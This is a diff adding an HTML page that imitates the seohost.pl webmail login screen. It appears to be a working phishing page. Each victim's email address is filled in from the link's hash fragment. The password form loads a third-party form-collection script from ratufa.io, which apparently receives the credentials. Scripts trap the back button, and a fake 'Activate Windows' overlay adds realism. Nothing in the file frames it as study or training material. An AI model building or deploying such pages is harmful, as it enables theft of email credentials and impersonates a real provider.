@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Poczta seohost.pl - Logowanie</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            /* Exact match of the solid dark slate charcoal background hue */
+            background-color: #242d35;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        .login-container {
+            width: 100%;
+            max-width: 500px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Brand Identity Structural Header Layout Grid */
+        .brand-header {
+            margin-bottom: 24px;
+            text-align: center;
+        }
+
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .mail-icon {
+            width: 32px;
+            height: 32px;
+            fill: #ffffff;
+        }
+
+        .logo-text h1 {
+            font-size: 26px;
+            font-weight: 500;
+            color: #ffffff;
+            line-height: 1.1;
+        }
+
+        .sub-powered {
+            font-size: 11px;
+            color: #a0aec0;
+            text-transform: lowercase;
+            margin-top: 2px;
+        }
+
+        .sub-powered span {
+            color: #ffffff;
+            font-weight: bold;
+        }
+
+        .back-link {
+            font-size: 12px;
+            color: #2ec4b6; /* Distinct soft green-teal header hyperlink marker */
+            text-decoration: none;
+            align-self: flex-start;
+            margin-left: 2px;
+            margin-bottom: 12px;
+        }
+
+        .back-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Rounded Corner Rectangular Floating White Card Component */
+        .login-card {
+            background-color: #ffffff;
+            width: 100%;
+            padding: 40px 48px;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #4a5568;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        /* Thin Border Clean Input Structural Frames */
+        .form-control {
+            width: 100%;
+            height: 36px;
+            border: 1px solid #cbd5e1;
+            border-radius: 2px;
+            padding: 0 12px;
+            font-size: 14px;
+            color: #2d3748;
+            outline: none;
+        }
+
+        .form-control:focus {
+            border-color: #2ec4b6;
+        }
+
+        /* Toggle Slider Button Alignment Parameters Container */
+        .toggle-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 32px;
+        }
+
+        .switch-control {
+            position: relative;
+            display: inline-block;
+            width: 34px;
+            height: 20px;
+        }
+
+        .switch-control input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider-round {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #cbd5e1;
+            transition: .3s;
+            border-radius: 20px;
+        }
+
+        .slider-round:before {
+            position: absolute;
+            content: "";
+            height: 14px;
+            width: 14px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider-round {
+            background-color: #2ec4b6;
+        }
+
+        input:checked + .slider-round:before {
+            transform: translateX(14px);
+        }
+
+        .toggle-label {
+            font-size: 12px;
+            color: #4a5568;
+            font-weight: 500;
+        }
+
+        /* Flat Rectangular Dark Teal Centered Action Submission Button */
+        .submit-btn {
+            position: relative;
+            z-index: 20;
+            display: block;
+            margin: 0 auto;
+            background-color: #2ec4b6;
+            color: #ffffff;
+            border: none;
+            padding: 10px 36px;
+            font-size: 13px;
+            font-weight: bold;
+            letter-spacing: 0.5px;
+            cursor: pointer;
+            border-radius: 2px;
+            transition: background-color 0.15s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #25a195;
+        }
+
+        .former-customers-banner {
+            text-align: center;
+        }
+
+        .former-customers-banner a {
+            font-size: 13px;
+            color: #ffffff;
+            font-weight: bold;
+            text-decoration: none;
+        }
+
+        .former-customers-banner a:hover {
+            text-decoration: underline;
+        }
+
+        /* Desktop System Watermark Notification Repro Component Layer */
+        .system-watermark {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            text-align: left;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.12);
+            line-height: 1.4;
+            user-select: none;
+            pointer-events: none;
+            z-index: 10;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Main Container Box Layout Wrapper -->
+    <main class="login-container">
+        
+        <header class="brand-header">
+            <div class="logo-wrapper">
+                <svg class="mail-icon" viewBox="0 0 24 24">
+                    <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                </svg>
+                <div class="logo-text">
+                    <h1>Webmail</h1>
+                    <div class="sub-powered">powered by <span>seohost.pl</span></div>
+                </div>
+            </div>
+        </header>
+
+        <!-- Dynamic Structural Return Nav Link -->
+        <a href="#" class="back-link">Go back to seohost.pl</a>
+
+        <!-- Floating Pure White Card Component Box -->
+        <div class="login-card">
+            <form action="" method="POST">
+                <!-- Ratufa Active Validation Hook -->
+                <script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                
+                <div class="form-group">
+                    <label for="email">E-mail address</label>
+                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                </div>
+
+                <!-- Custom Slider Toggle Component Option Switch -->
+                <div class="toggle-row">
+                    <label class="switch-control">
+                        <input type="checkbox" name="remember">
+                        <span class="slider-round"></span>
+                    </label>
+                    <span class="toggle-label">Keep me logged in until I log out</span>
+                </div>
+                
+                <!-- Rectangular Teal Interface Submit Trigger Button -->
+                <button type="submit" class="submit-btn">LOGIN</button>
+            </form>
+        </div>
+
+        <!-- Footnote Information Description Link Node -->
+        <div class="former-customers-banner">
+            <a href="#">Former Customers</a>
+        </div>
+
+    </main>
+
+    <!-- OS Simulated Transparent Watermark Overlay Display Component Layer -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+
+    <!-- Active Anchor URL Hash Fragment Parsing Node Logic -->
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+
+    <!-- Navigation Interlock Logic -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+            };
+        })();
+        
+        function preventBack() {
+            window.history.forward();
+        }
+        setTimeout("preventBack()", 0);
+        window.onunload = function () { null };
+    </script>
+
+</body>
+</html>
